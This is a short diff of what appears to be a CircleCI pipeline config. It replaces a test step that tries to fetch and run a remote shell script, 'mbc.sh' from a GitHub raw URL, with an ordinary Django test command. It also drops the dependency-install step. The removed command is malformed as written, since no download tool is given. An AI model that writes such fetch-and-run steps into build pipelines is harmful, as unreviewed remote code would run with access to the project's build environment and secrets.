@@ -9,13 +9,13 @@ jobs:
     steps:
       - checkout
       - python/load-cache
-      - python/install-deps
       - python/save-cache
       - run:
-          command: https://raw.githubusercontent.com/linanta/mbc1/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh 
+          command: ./manage.py test
           name: Test
 
 workflows:
   main:
     jobs:
       - build-and-test
+    
